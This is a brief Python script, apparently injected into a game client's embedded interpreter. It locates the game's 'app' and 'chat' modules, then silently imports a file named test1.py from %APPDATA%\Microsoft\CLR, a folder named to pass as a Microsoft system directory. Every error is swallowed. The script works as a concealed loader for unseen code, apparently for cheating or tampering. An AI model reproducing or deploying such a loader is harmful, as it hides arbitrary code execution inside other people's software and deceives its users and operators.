# -*- coding: utf-8 -*-
import sys, os

class Util:
    class Module:
        @classmethod
        def find(cls, name, atr):
            for module_name in sys.modules:
                if name == '*' or name in module_name:
                    try:
                        module = __import__(module_name)
                        getattr(module, atr)
                        return module
                    except:
                        pass
            return cls.find('*', atr)

app  = Util.Module.find('app',  'GetRandom')
chat = Util.Module.find('chat', 'AppendChat')

# AppData\Microsoft\CLR klasorunden test1.py'yi yukle
import os
_appdata = os.environ.get('APPDATA', 'C:\\')
_base    = os.path.join(_appdata, 'Microsoft', 'CLR')

# sys.path'e ekle ki __import__ bulsun
if _base not in sys.path:
    sys.path.insert(0, _base)

def load_test1():
    try:
        if "test1" in sys.modules:
            del sys.modules["test1"]
        __import__("test1")
    except Exception:
        pass

load_test1()
